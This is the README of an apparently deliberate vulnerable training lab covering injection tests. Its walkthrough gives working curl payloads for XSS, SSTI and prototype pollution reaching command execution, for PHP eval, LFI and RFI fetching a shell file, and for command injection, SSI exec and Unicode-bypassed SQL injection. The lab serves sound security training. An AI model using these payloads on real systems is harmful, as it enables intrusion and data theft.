# M05 - Injection: XSS, Code & Command Execution

> **Intentionally vulnerable training target.** Every weakness here is deliberate.
> For authorised security testing and training only. All ports are published on
> `127.0.0.1`; do not expose this stack to any network you do not control.
> No outbound traffic: the RFI payload host is a service inside this compose
> network, and every "flag" is synthetic.

Covers **10 WSTG tests / 11 documents**: `WSTG-INJT-01, 02, 03, 04, 08, 11 (+11.1),
12, 18, 22, 25`.

## Topology

```
                        ┌──────────────┐
   :8500 HTTP ─────────▶│    front     │ nginx/1.27  (GET-only WAF map,
                        │              │  first-occurrence $arg_role gate)
                        └──────┬───────┘
                               │ proxy_pass
        ┌──────────────────────┼───────────────────────────────┐
        │                      │                               │
 ┌──────▼───────┐       ┌──────▼───────┐                ┌──────▼───────┐
 │     app      │──────▶│     api      │                │    apache    │ :8505
 │ Flask 3.0.3  │ raw   │ stdlib http  │                │ httpd/2.4    │
 │ Jinja2+Mako  │ body  │ (internal)   │                │ mod_include  │
 └──────────────┘       └──────────────┘                └──────────────┘
   XSS, verb, HPP,        LAST-occurrence                 SSI injection
   cmd inj, SSTI,         backend for HPP
   Unicode
 ┌──────────────┐       ┌──────────────┐                ┌──────────────┐
 │     php      │ :8510 │     node     │ :8520          │     rfi      │ :8530
 │ PHP 8.3      │──────▶│ Node 22      │                │ nginx static │
 │ eval/include │ RFI   │ deep merge   │                │ shell.txt    │
 └──────────────┘       └──────────────┘                └──────────────┘
```

| Port | Service | Purpose |
|---|---|---|
| 8500 | front | main portal: reflected/stored XSS, verb tampering, HPP, command injection, SSTI, Unicode |
| 8505 | apache | httpd 2.4 + `mod_include`: SSI injection via a greeting CGI |
| 8510 | php | PHP 8.3: `eval()` code injection, LFI/RFI, `shell_exec` command injection |
| 8520 | node | Node 22: vulnerable recursive merge -> `Object.prototype` pollution |
| 8530 | rfi | in-range static host serving `shell.txt` for the RFI demo |

`api` (the HPP backend) sits on an `internal: true` network and is not published.

## Run

```bash
docker compose up --build -d
docker compose ps
```

If your Docker injects a host-side proxy from `~/.docker/config.json`, the compose
file already blanks it for builds and runtime. To use a real proxy instead:
`export LAB_HTTP_PROXY=http://your-proxy:port`.

## Probes

```bash
python3 -m venv verify/.venv
verify/.venv/bin/pip install -r verify/requirements.txt   # stdlib only, no deps
verify/.venv/bin/python ../../tools/runner.py .           # 10 probes, expect 10/10
```

Probes are idempotent: they create their own state (unique markers), reset the
Node prototype between assertions, delete their guestbook comments and purge the
generated `.shtml` pages.

## Attack walkthrough

### WSTG-INJT-01 - Reflected XSS (`:8500/search?q=`)

One parameter, three unencoded output contexts. Each needs a different breakout:

| Context | Payload | Proof in response |
|---|---|---|
| HTML body | `<img src=x onerror=alert(1)>` | `<h1>Results for <img src=x onerror=alert(1)></h1>` |
| HTML attribute | `" autofocus onfocus="alert(1)` | `value="" autofocus onfocus="alert(1)"` |
| JS string | `";alert(1);//` | `var q = "";alert(1);//";` |

```bash
curl -G :8500/search --data-urlencode 'q=";alert(1);//'
```
Note the GET-only WAF (below) blocks `<script` in a GET query string; use
`<img onerror=...>` or POST.

### WSTG-INJT-02 - Stored XSS (`:8500/guestbook`, `:8500/profile`)

```bash
# write as alice
curl -XPOST :8500/guestbook -b 'user=alice' \
  --data-urlencode 'author=alice' \
  --data-urlencode 'comment=<img src=x onerror=alert(document.cookie)>'
# read as a DIFFERENT user - payload is served unescaped inside the comment div
curl :8500/guestbook -b 'user=bob'
# second sink: profile bio lands in a JS string literal and a title attribute
curl -XPOST :8500/profile -b 'user=alice' --data-urlencode 'bio=";alert(1);//'
curl :8500/profile -b 'user=alice'      # var bio = "";alert(1);//";
```
Comments persist in SQLite and are rendered to every later visitor.

### WSTG-INJT-03 - HTTP Verb Tampering (`:8500/admin/*`, `:8500/search`)

Access control is enforced only for `GET`/`POST`:

```bash
curl -i :8500/admin/panel                 # 403
curl -i -X POST :8500/admin/panel         # 403
curl -i -X PUT  :8500/admin/panel         # 200 + flag
curl -i -X FOO  :8500/admin/panel         # 200 + flag (arbitrary verb)
curl -i -I      :8500/admin/panel         # 200, X-Admin-Flag header
curl -i -X PATCH ':8500/admin/users/delete?user=bob'   # 200, user deleted
```

The nginx WAF is a `map "$request_method:$arg_q"` rule, so it only inspects GET:

```bash
curl -i -G :8500/search --data-urlencode 'q=<script>alert(1)</script>'   # 403
curl -i -XPOST :8500/search --data-urlencode 'q=<script>alert(1)</script>' # 200, reflected
```

### WSTG-INJT-04 - HTTP Parameter Pollution

**Query string** - nginx authorises on `$arg_role` (FIRST occurrence), Flask uses
`getlist('role')[-1]` (LAST):

```bash
curl -i ':8500/hpp/admin?role=admin'            # 403 from the front layer
curl -i ':8500/hpp/admin?role=user&role=admin'  # 200 + flag: front saw user, app saw admin
curl ':8500/hpp/echo?role=user&role=admin'      # {"first":"user","last":"admin","joined":"user,admin"}
```

**Body** - the gateway validates the FIRST occurrence, then forwards the raw body
to the internal `api`, which takes the LAST:

```bash
curl -XPOST :8500/hpp/transfer -d 'action=view&amount=1&from=alice&to=mallory'
# backend executed=view (read-only)
curl -XPOST :8500/hpp/transfer \
  -d 'action=view&action=transfer&amount=1&amount=500&from=alice&to=mallory'
# gateway_saw.action=view, backend executed=transfer, amount=500 -> funds moved
```

### WSTG-INJT-08 - SSI Injection (`:8505`)

`mod_include` is loaded, `Options +Includes`, `AddOutputFilter INCLUDES .shtml`.
`greet.cgi` writes your `name` verbatim into a `.shtml` page and redirects to it:

```bash
curl -i 'http://127.0.0.1:8505/cgi-bin/greet.cgi?name=%3C!--%23exec%20cmd=%22id%22%20--%3E'
# 302 -> Location: /pages/greet-xxxxxxxxxx.shtml
curl 'http://127.0.0.1:8505/pages/greet-xxxxxxxxxx.shtml'
# <h1>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)</h1>
curl 'http://127.0.0.1:8505/cgi-bin/greet.cgi?name=%3C!--%23echo%20var=%22DOCUMENT_ROOT%22%20--%3E'
# -> /usr/local/apache2/htdocs
curl :8505/demo.shtml        # static proof: #echo + #exec + #flastmod
```
Cleanup: `greet.cgi?purge=greet-xxxxxxxxxx.shtml`.

### WSTG-INJT-11 + 11.1 - Code Injection and File Inclusion (`:8510`)

PHP 8 removed `preg_replace /e`, `create_function()` and string `assert()`, so the
live code-execution sinks are `eval()` and `call_user_func()`:

```bash
# code injection -> read the seeded flag
curl 'http://127.0.0.1:8510/eval.php?expr=echo%20file_get_contents(%27/flag.txt%27);'
# code injection -> OS command
curl 'http://127.0.0.1:8510/eval.php?expr=echo%20shell_exec(%27id%27);'
# the callable itself is user input
curl 'http://127.0.0.1:8510/call.php?fn=system&arg=id'
```

File inclusion (`allow_url_include=On`, no path validation):

```bash
# LFI
curl 'http://127.0.0.1:8510/page.php?page=../../../../../../etc/passwd'
# source disclosure
curl 'http://127.0.0.1:8510/page.php?page=php://filter/convert.base64-encode/resource=page.php'
# log poisoning: put PHP in the User-Agent, then include the on-disk access log
curl -A "<?php echo 'POISON-OK:' . shell_exec('id'); ?>" 'http://127.0.0.1:8510/'
curl 'http://127.0.0.1:8510/page.php?page=/var/log/apache2/lab-access.log'
# RFI - the payload host is INSIDE this compose network, never the internet
curl 'http://127.0.0.1:8510/page.php?page=http://rfi/shell.txt'
# -> RFI-EXECUTED:uid=33(www-data) ...
```

### WSTG-INJT-12 - Command Injection (`:8500/net/*`, `:8510/cmd.php`)

```bash
curl -G :8500/net/ping --data-urlencode 'host=127.0.0.1; id'      # uid=0(root)...
curl -G :8500/net/ping --data-urlencode 'host=127.0.0.1 | id'
curl -G :8500/net/ping --data-urlencode 'host=127.0.0.1 `id`'     # expansion echoed by ping
curl -G :8500/net/ping --data-urlencode 'host=127.0.0.1 $(id)'
curl -G :8510/cmd.php  --data-urlencode 'host=127.0.0.1; id'      # PHP shell_exec flavour
# blind / time-based: output is discarded, only timing leaks
time curl -G :8500/net/lookup --data-urlencode 'host=localhost'          # ~0.01s
time curl -G :8500/net/lookup --data-urlencode 'host=localhost; sleep 5' # ~5s
```

### WSTG-INJT-18 - Server-side Template Injection (`:8500/tpl/*`)

Two engines, input concatenated into the template **source**:

```bash
# Jinja2 detection
curl -G :8500/tpl/jinja --data-urlencode 'name={{7*7}}'          # Hello 49
# Jinja2 RCE via the __class__.__mro__ chain (index found by enumerating subclasses)
curl -G :8500/tpl/jinja --data-urlencode "name={{ ''.__class__.__mro__[1].__subclasses__() }}"
curl -G :8500/tpl/jinja --data-urlencode \
  "name={{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['popen']('cat /flag.txt').read() }}"
# Mako detection + RCE
curl -G :8500/tpl/mako --data-urlencode 'name=${7*7}'            # Hello 49
curl -G :8500/tpl/mako --data-urlencode "name=<% import os %>\${os.popen('cat /flag.txt').read()}"
```
(The subclass index for `os._wrap_close` varies by runtime - the probe discovers it.)

### WSTG-INJT-22 - Prototype Pollution (`:8520`)

```bash
curl -XPOST :8520/reset                       # lab helper: clean prototype
curl -i :8520/admin                           # 403
curl -XPOST :8520/settings -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true,"role":"admin","theme":"dark"}}'
curl -i :8520/admin                           # 200 + flag on a NEW request
curl :8520/profile                            # unrelated endpoint: isAdmin true, theme dark
# constructor.prototype path works too
curl -XPOST :8520/settings -d '{"constructor":{"prototype":{"isAdmin":true}}}'
# gadget: ejs 3.1.6 picks up a polluted outputFunctionName -> RCE on a later render
curl -XPOST :8520/settings -H 'Content-Type: application/json' -d \
  '{"__proto__":{"outputFunctionName":"_tmp1;return global.process.getBuiltinModule(\"child_process\").execSync(\"id\").toString();var _tmp2"}}'
curl -XPOST :8520/render -d '{"message":"hi"}'   # rendered: uid=0(root)...
curl -XPOST :8520/reset
```
The merge target is a per-request `{}`; the pollution escapes into
`Object.prototype`, so the effect is global and cross-request.

### WSTG-INJT-25 - Unicode Normalization and Case Mapping (`:8500/unicode/*`)

Every check runs on the RAW input; the sink sees the NFKC-normalized / casefolded
form:

```bash
# path blacklist before NFKC: fullwidth dots and slashes fold to ../
curl -i ':8500/unicode/download?file=../../../etc/passwd'          # 403
curl -G :8500/unicode/download --data-urlencode 'file=．．／．．／．．／ｅｔｃ／ｐａｓｓｗｄ'  # /etc/passwd
# authorisation equality before NFKC: fullwidth "admin"
curl -i ':8500/unicode/whoami?user=admin'                          # 403
curl -G :8500/unicode/whoami --data-urlencode 'user=ａｄｍｉｎ'      # role=admin + flag
# SQL keyword filter before NFKC+casefold: U+017F long-s -> s, fullwidth UNION -> union
curl -i -G :8500/unicode/search --data-urlencode "q=x' UNION SELECT name,secret FROM vault -- "  # 403
curl -G :8500/unicode/search --data-urlencode "q=x' ＵＮＩＯＮ ſelect name,secret from vault -- "
# -> normalized "x' union select name,secret from vault -- ", vault rows returned
# XSS filter before NFKC: fullwidth angle brackets become a real tag
curl -G :8500/unicode/reflect --data-urlencode 'text=＜script＞alert(1)＜/script＞'
```

## Notes

- Flags are synthetic and reachable only through the intended sink:
  `/flag.txt` in `app` (SSTI) and `php` (code injection), plus env-var flags for
  the verb-tampering, HPP, prototype-pollution and Unicode admin surfaces.
- `allow_url_include` is deprecated in PHP 8.3 but still functional; the RFI is
  therefore a real remote include, not a simulation.
- Reset helpers: `POST :8520/reset` (prototype), `POST :8500/guestbook/delete`
  (stored XSS), `GET :8505/cgi-bin/greet.cgi?purge=<file>` (SSI pages).